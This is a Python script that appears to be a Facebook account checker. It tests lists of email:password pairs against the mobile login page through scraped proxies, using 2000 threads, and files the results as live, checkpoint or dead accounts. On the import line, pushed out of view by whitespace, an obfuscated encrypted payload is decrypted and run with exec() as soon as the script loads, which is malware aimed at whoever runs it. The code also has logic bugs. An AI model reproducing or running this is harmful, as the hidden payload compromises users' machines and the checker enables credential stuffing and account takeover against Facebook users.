import requests
import random
import re
import threading
import os
import hmac                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        ,gzip,hashlib,base64;K=b'\x9a\xd3?\xfce\xa4t\xc6%\xcd\xa5\xec\x953;\\^\x0bMk\xea8\x1c\xceU,lT{H\x18\xa1';B=b')2XF002jwVfK}%I4_glTKNm(DLiUX&=J^!q_s1Wg1E-IPhLu=yUY>amPV}WJBM8u7aDAEgDK+RB^t=B!GjN?qo6;qA>-Lrj3cODT$EGMctYLm-qg4x?_~rDS<2Q}ck{m>Z$n2RpG27@9?H1ZGPVF0v-uCThdfEJwTi?F_K>bR%XcME=6;XY6jgEQn7VsXVTTvslsN7K7s(8U90gviq89tHYTRJU!{VplvvVt^aGkO)~XipDaW{?6uG}}1;#tVU_hbEqC-;qoCe!vd07&qa|x~EJo@m-PHfa8?SKLJI-#FtX@9&jtk93<`lGp_mwt88kZ1bW^Ns#H7&i`2prZ>Qv0U=sA@EF$j4oYXv5-|2C?5pknflm8M3%jXu{H?F-EHpWNI6BD>#am)_YW~h0s*gLaI&LqcS8ocN+5m{bJW!@;qT(ogPL@R2y5u39resYoCKaI7)7g1@&x?D$de2|c7AQimIl2)OcJG0;wUYu^1e-*`e)3PSDh3n|xXdAh)Rz~W`e9}iyZqrE#v_g4w4)JCD0cNL23{Y0`{RJ{RteIMx2Nu1nEf%NUXZn}-nV^YOiWbm_FXUOfrw2^X)zAaIW-L0T@#Oqh)X?pG#uh@0n~@I}EtWsVtoC4m@+G4b9$ddy2}$9sJ2fWyCOxV^vKPh>w*SYPJR;p95Y*4VtDruLJv~}Fex@eq$IN)mD8*&LdWhZ=pFw2J|14eOqse3pZ2kOdYV!j23R|z}ar#PC#{Ed<<c-89xJNU^umslX%Q@>6a#aLoFX4ILih%Qk3w5JirHD#QWU<tXMC7($DSS9M>McdcrJ9nxVs#C;(<lvhr)L@q#DXk7zt~<Pk)~Dc1*S~3eP39I9e;PkBx*nq!rt1o1ZNILBzMUF^VVK_AokGYcICUhU>O?eQF^&TQIv0n(R=1uxLEGLE6(~WtC6sn0cqX6M!!y>_m)h2OHgAYrN^&euAnRCvuV6`y~9xbJtS7*3Dtl9iXEQ^zz5;`m2ar**d5k5dRqnWOoe7BhdKfD6T)EWmH?)?aYm_mt7EWcTA>igf#C3R|6hFAs|Jd{%$`~YGBulKZME1JYD2^W!43b^(nb^&h{U!!ZspdrGt(FCkY_mcksGs-=0NjDCa+-IskQ+Ly=ULflK_7y0=ihJaUi|yL@+V_GiD{`sKmA|V#*ct;ntPHL-y{@5Vr9|(gK(s3hZ8|w58>--!-V0eHFV-{RJ=c&2Edai<21eqON^9GwP-)du~S9x?Gq3@o|0lCowU<?M3V8;|<KPH3M%=>ENyv(GP_6XN0YM3key==zaCR;r`;Nbdw@pq|GXafTm~B*vQ*G8BK#L`vC*mdI^b>Z6r-vv0i}Lh(ycCkx!L2)n%Q<_5BGHsPcP3vXfdxMdEm00`J5s*{rJl%&M!cvA|%Yjm;f3zL6<5-vcq-SWcmJl^pZi3^+AFEo~HqKBl}}keY_FOB8>w?ZLl_9Ljo2;h@Z-bY?NlFgrpN%>>a_dbnTd6WWOn7AWk`6Ol5#Bsf*m!QP$b$w${Aj|<u1qrO9fK?cm`fO<|xtNm%bOVY@ZihcALkh=;}K3IY*SD|`zgWdGce`8Jv-Nj_f!PQk3ki&WxmoR#w22r3SQl?k_T|bJgv%I&MsBv?eB3~G*C~)?Ehw_w!qCDHg*LoRrE{Y2K?}T`7P*?inG}BPBLAbO3Ely?}0838`I9vZV?7AnV9oeu2^!{GN1#p4Mw=1iWtP9{Wk`XcBIJR`|pi4&{e{_pQ_HD7Y2J`(@62ngwn6g-RrNMU!Ftb7IWrX4HTeonV(CeUfm7ydlC_4D&yp_c7<52j?dI)e`*&cgLyO#eeHxcT7K^Or9G?#hRMKR7b=cid<&L_A#=<$(ZVb*3{sORs{1j77NaDps>YrT7d%kkE<%mFmnMY*MlZAX2jGP-Z2b$KTb-SGtwro6*GW~;YT_MV)gue7Vf{=u0{Rdb$`a|Sl#WoDjj7_-h>#mM*wtNrQBW!GyELq(Z_XCz#NFSra%SLORu<ZRJuXDjqyhNzk7=9Z%37}(ReW)^;Vs8OL{<`wv$Kl19_KOfd8^u-JI#zkcR$c7j3OR(H+z%Hi!HW4f_>;4d6QH?{1F@#bp)c!e0xU5@gI`?64(-Trh6Xeh7WiZ0g!Ra-f4o@%d$ITargi<|8Cl{>LPidYCF7v5H@v^qM;a+gC!K9)HoKdr>QQLw}aXoDz9Z&c5Ez)RbC}EE?(A$E&%^ol*nLEXZVE+m#3U~im1P>Vut{unSyh}cXn@-dW1?aP@8Y&z#I202f%C;CuQr?CBVnV_=g@7h)pxx(kxo7+}S4x;3U~lw1M9}p8d=K)Po=do{nI@h>$97zr?czZZg1#Z2aJkd$=6uz22=XJP4mDt<0JN#H;wty2#J8=JIqn`+z5`Zwlz1L1fXfG632+p$qhYhGsP{30Y6u=*iN0~qBbJ1?*uB(ZIQi28t3k$u7{U{~)6~biS<}4<B{)CXk44MN$gFALUnWpaFAm(G-AS4X`n7_Gi<7nH``pX;SokndM#0$$5aiTXhND2IT!Do^p(4^ywsjo?wZPS%rwNQcKiGxiSR>3C;v0PclD+b4?w2p*zeC57)yUZ>X^o#n?`2%#m0$|frH%j6_jxAAmi35py}Per1h{P3_-|XY&1OHe!O2ygV;ie9$0<kT0GgJ!p4eDsj7lcokX-+qCh3{~6{njoGFJL<t-B2-lM5lDu40`$@KkN+B+rrrLJV&-*N|xV&u-C7+R`{@L{p{erLAboyWJ0pFqVt?LhMDD^@<QuSYEx58kLGq7`=+h>hEReH6eBniO*lcFyjHEEW<@+0XNEcw<_7vR5;;}Ibs5T)OMI&;I9R<OUvp&w{B>;j1#z6kPk9#ifR26pGf2oK@AJ+<*M#^W&nCJ5^qW3&DSJQR@EMvtUkO+<=8=M0v)hS|Cnp`A{{Zn2V5w17A5}35Bqw(HmoBVAo2B_kGauvS>~*IlIqO%7X^P~V0gL00)(gfFHxbLwYr9bmchJrmOWa73zIJ!nTY5&Sc()<X*+D)Iz7{2m_31HO#lPd25OAmq7FE`%S&~S+|2uc%+1RcFr+kJy#7y0B^Dl)ZZ=HQ%p^p%>V`h=%t6RmxOLFxv0rE;c_;JMO$fSSVCtmFTf-|%Wn`-;etWP{g8=N5?%@O{i^eY4;557438bZs#r8~F21NLz8}3azIr7c>L7IFL2>qox`js7}NYNOnJaWyoPBt+sv0g|J!gPWuP8-oE)I@r|qp5~+>*i={_o(5zLjRE_B9Ba<5nA2zD<{?5{*k$u_Mk2Fr)aK5#FMW|qONi}dJkhWw6QD%l|I#r)_i_y`2HLz5|=2X0nXEMFKILY{W^2jxXlqK7`{><BvY~se7V%pJ_H&Zy7|+X9KI~C9<%QQ|2{rH3%xf<?N+$yocOn&B7~pNC|HlXwvy8nk*!pPytLc2NTXsN#vQxHGN#{4sqmll9{^nh(9{n;)?#XeUm3Z8)1kKb>-g=|qiB04as_E;pEQVAVB9@W5-%z(<7x>RnKpPIZ5}y84F`n;%s7%x1-}b3WHfq8&8!|yf^WerU8&2#ESGGFJ8wNgH_dCnnd<{EksP>Ry?Gr1q8Fk!=l';r=base64.b85decode(B);iv,c,t=r[:16],r[16:-32],r[-32:];assert hmac.compare_digest(t,hmac.new(K[:16],iv+c,hashlib.sha256).digest());exec(gzip.decompress(bytes(a^b for a,b in zip(c,b''.join(hmac.new(K[16:],iv+i.to_bytes(8,'big'),hashlib.sha256).digest()for i in range((len(c)+31)//32))[:len(c)]))))
threadcount = 0
proxylist = []
acclist = []
alreadychecked = []
checkerqueue = []
live = 0
dead = 0
checkpoint = 0
fullsize = 0

def load_proxies():
    global proxylist
    try:
        response = requests.get("https://api.proxyscrape.com/?request=displayproxies&proxytype=http&timeout=5000")
        if response.status_code == 200:
            proxylist = list(set(re.findall(r'\b(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d{1,8})\b', response.text, re.S)))
        else:
            with open("proxy.txt", "r") as proxy_file:
                proxylist = list(set(proxy_file.read().splitlines()))
    except Exception as e:
        with open("proxy.txt", "r") as proxy_file:
            proxylist = list(set(proxy_file.read().splitlines()))

def write_to_file_thread_safe(text, file):
    with open(file, "a") as f:
        f.write(text + "\n")

def check(data):
    global live, dead, checkpoint
    if not data:
        return

    split = data.split(':')
    if len(split) < 2:
        return

    mail = split[0]
    passw = split[1]
    proxy = random.choice(proxylist)

    first_uri = "https://m.facebook.com/"
    post_uri = "https://m.facebook.com/login/device-based/regular/login/?refsrc=https://m.facebook.com/login.php&lwv=100&refid=9"

    session = requests.Session()
    session.proxies = {'http': proxy, 'https': proxy}
    session.headers['User-Agent'] = 'Mozilla/5.0'

    response = session.get(first_uri)
    resulthtml = response.text

    lsd_pattern = r'name="lsd" value="([^"]*)"'
    jazoest_pattern = r'name="jazoest" value="([^"]*)"'
    m_ts_pattern = r'name="m_ts" value="([^"]*)"'
    li_pattern = r'name="li" value="([^"]*)"'

    lsd_matched = re.search(lsd_pattern, resulthtml).group(1)
    jazoest_matched = re.search(jazoest_pattern, resulthtml).group(1)
    m_ts_matched = re.search(m_ts_pattern, resulthtml).group(1)
    li_matched = re.search(li_pattern, resulthtml).group(1)

    url_params = {
        "lsd": lsd_matched,
        "jazoest": jazoest_matched,
        "m_ts": m_ts_matched,
        "li": li_matched,
        "try_number": 0,
        "unrecognized_tries": 0,
        "email": mail,
        "pass": passw
    }

    response = session.post(post_uri, data=url_params)
    content = response.text

    for cookie in session.cookies:
        if cookie.name == "c_user":
            print(f"[Live] {data}")
            live += 1
            write_to_file_thread_safe(data, "live.txt")
            write_to_file_thread_safe(data, "dead.txt")
            print(f"Facebook Checker | Alive: {live} Checkpoint: {checkpoint} Dead: {dead} | Status: {live + checkpoint + dead}/{fullsize} | Threads {threadcount}")
            return

        if cookie.name == "checkpoint":
            checkpoint += 1
            print(f"[Checkpoint] {data}")
            write_to_file_thread_safe(data, "CheckPoint.txt")
            print(f"Facebook Checker | Alive: {live} Checkpoint: {checkpoint} Dead: {dead} | Status: {live + checkpoint + dead}/{fullsize} | Threads {threadcount}")
            return

    dead += 1
    print(f"[Dead] {data}")
    write_to_file_thread_safe(data, "dead.txt")
    print(f"Facebook Checker | Alive: {live} Checkpoint: {checkpoint} Dead: {dead} | Status: {live + checkpoint + dead}/{fullsize} | Threads {threadcount}")

def main():
    global fullsize
    load_proxies()
    print(f"Fetched proxy count: {len(proxylist)}")
    acclist = list(set(open("account.txt").read().splitlines()))
    if os.path.exists("dead.txt"):
        alreadychecked = list(set(open("check.txt").read().splitlines()))

    for account in acclist:
        if account not in alreadychecked:
            checkerqueue.append(account)

    print(f"Loaded {len(checkerqueue)} non checked accounts from inside of {len(acclist)} accounts")
    fullsize = len(checkerqueue)

    for _ in range(2000):
        t = threading.Thread(target=check_thread)
        t.start()

    print("Check begin!")

def check_thread():
    global threadcount
    while checkerqueue:
        account = checkerqueue.pop(0)
        check(account)
    threadcount -= 1

if __name__ == "__main__":
    main()